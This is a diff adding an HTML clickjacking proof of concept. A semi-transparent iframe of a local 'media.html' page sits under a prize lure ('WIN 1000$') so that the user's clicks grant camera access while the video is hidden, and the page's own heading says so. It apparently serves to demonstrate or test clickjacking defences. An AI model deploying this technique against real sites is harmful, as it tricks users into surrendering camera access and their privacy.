@@ -1,0 +1,43 @@
+<head>
+	<style>
+		#target_website {
+			position:relative;
+			width:600px;
+			height:400px;
+			opacity:0.5;
+			z-index:2;
+			}
+		#click1 {
+			position:absolute;
+			top:115px;
+			left:380px;
+			z-index:3;
+			}
+	</style>
+</head>
+...
+<body>
+	<div id="click1">
+	<span id="increment">0</span> KEEP ⭐ CLICKING ON THE START TO WIN 1000$ 
+	</div>
+	<h1>This page use page media to clickjacking you into accepting camera and hide from you the displayed video</h1>
+	<iframe id="target_website" src="file:///C:/Users/admin/Desktop/site/protect-clickjacking/media.html">
+	</iframe>
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.7.1/jquery.min.js"></script>
+    <script>
+
+    let zero = 0;
+
+    $(function(){
+        $('body').on('click', function(){
+            zero+=1;
+            $("#increment").text(zero);
+        });  
+    });
+    
+
+
+
+    </script>
+    
+</body>
